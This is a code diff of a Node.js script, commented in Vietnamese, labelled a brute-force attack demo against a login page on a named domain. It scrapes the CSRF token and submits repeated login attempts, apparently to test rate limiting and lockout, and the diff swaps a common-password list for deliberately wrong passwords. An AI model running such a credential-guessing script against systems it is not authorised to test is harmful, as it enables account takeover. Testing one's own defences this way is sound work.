@@ -10,26 +10,36 @@ const axios = require('axios');
 
 // Cấu hình
 const BASE_URL = 'http://tmd1907.id.vn';
-const TARGET_USERNAME = 'testuser'; // Thay đổi thành username thực tế
+const TARGET_USERNAME = 'testuser2';  // Thử tài khoản khác
 const ATTACK_PASSWORDS = [
-  'password123',
-  'admin123',
-  'test123',
-  'password1',
-  'password2',
-  'password3',
-  'password4',
-  'password5',
-  'qwerty123',
-  'letmein'
+  'wrongpass1',
+  'wrongpass2',
+  'wrongpass3',
+  'wrongpass4',
+  'wrongpass5',
+  'wrongpass6',
+  'wrongpass7',
+  'wrongpass8',
+  'wrongpass9',
+  'wrongpass10'
 ];
+
+// Create axios instance with cookie jar
+const axiosInstance = axios.create({
+  withCredentials: true
+});
+
+// Để handle form-urlencoded data
+const querystring = require('querystring');
 
 console.log('🔴 DEMO: Brute Force Attack');
 console.log('================================');
 console.log(`Target URL: ${BASE_URL}`);
 console.log(`Target Username: ${TARGET_USERNAME}`);
 console.log(`Number of attempts: ${ATTACK_PASSWORDS.length}`);
-console.log('================================\n');
+console.log('================================');
+console.log('\n⚠️  NOTE: Trong production, CSRF token có thể không khớp giữa request');
+console.log('nếu session không được maintain properly.\n');
 
 /**
  * Hàm thực hiện tấn công brute force
@@ -38,6 +48,24 @@ async function bruteForceAttack() {
   let successCount = 0;
   let failureCount = 0;
   let blockedCount = 0;
+  let csrfToken = '';
+  
+  // Bước 1: Lấy CSRF token từ trang login
+  console.log('📍 Step 1: Lấy CSRF token từ trang login...\n');
+  try {
+    const loginPage = await axiosInstance.get(`${BASE_URL}/login`);
+    const csrfMatch = loginPage.data.match(/name="_csrf"\s*value="([^"]+)"/);
+    if (csrfMatch) {
+      csrfToken = csrfMatch[1];
+      console.log(`✅ CSRF token lấy được: ${csrfToken.substring(0, 20)}...`);
+      console.log(`   Cookies stored: ${Object.keys(axiosInstance.defaults.headers).length > 0 ? 'Yes' : 'No'}\n`);
+    } else {
+      console.log('⚠️  Không tìm thấy CSRF token trong HTML\n');
+      console.log('🔍 Đang dùng token rỗng để test rate limiting...\n');
+    }
+  } catch (error) {
+    console.log(`⚠️  Lỗi khi lấy CSRF token: ${error.message}\n`);
+  }
   
   for (let attempt = 1; attempt <= ATTACK_PASSWORDS.length; attempt++) {
     const password = ATTACK_PASSWORDS[attempt - 1];
@@ -45,12 +73,21 @@ async function bruteForceAttack() {
     try {
       console.log(`[Attempt ${attempt}/${ATTACK_PASSWORDS.length}] Trying password: "${password}"...`);
       
-      const response = await axios.post(`${BASE_URL}/login`, {
+      const payload = {
         username: TARGET_USERNAME,
-        password: password
-      }, {
-        validateStatus: () => true // Không throw error, return status code
-      });
+        password: password,
+        _csrf: csrfToken || ''  // Có thể rỗng, server sẽ reject CSRF
+      };
+      
+      const response = await axiosInstance.post(`${BASE_URL}/login`, 
+        querystring.stringify(payload), 
+        {
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          validateStatus: () => true
+        }
+      );
 
       if (response.status === 200 || response.status === 302) {
         console.log(`✅ SUCCESS! Password found: "${password}"`);
@@ -64,19 +101,21 @@ async function bruteForceAttack() {
         blockedCount++;
         break; // Bị rate limit, dừng
       } else if (response.status === 403) {
-        console.log(`⚠️  BLOCKED! Forbidden (CSRF/Account Locked)`);
+        console.log(`⚠️  BLOCKED! Forbidden (CSRF)`);
         console.log(`   Status: ${response.status}`);
-        console.log(`   Message: ${response.data?.message || 'Forbidden'}`);
+        console.log(`   Message: ${response.data?.message || response.data?.error || 'Forbidden'}`);
         blockedCount++;
         break; // Bị khóa, dừng
       } else if (response.status === 400 || response.status === 401) {
         console.log(`❌ FAILED! Wrong password`);
         console.log(`   Status: ${response.status}`);
-        console.log(`   Message: ${response.data?.error || 'Invalid credentials'}`);
+        console.log(`   Message: ${response.data?.error || response.data?.message || 'Invalid credentials'}`);
         failureCount++;
       } else {
-        console.log(`⚠️  Unexpected response: ${response.status}`);
-        console.log(`   Data: ${JSON.stringify(response.data).substring(0, 100)}`);
+        console.log(`⚠️  Status: ${response.status}`);
+        if (response.data) {
+          console.log(`   Data: ${typeof response.data === 'string' ? response.data.substring(0, 100) : JSON.stringify(response.data).substring(0, 100)}`);
+        }
       }
       
       // Delay 1 giây giữa các attempt để không quá nhanh
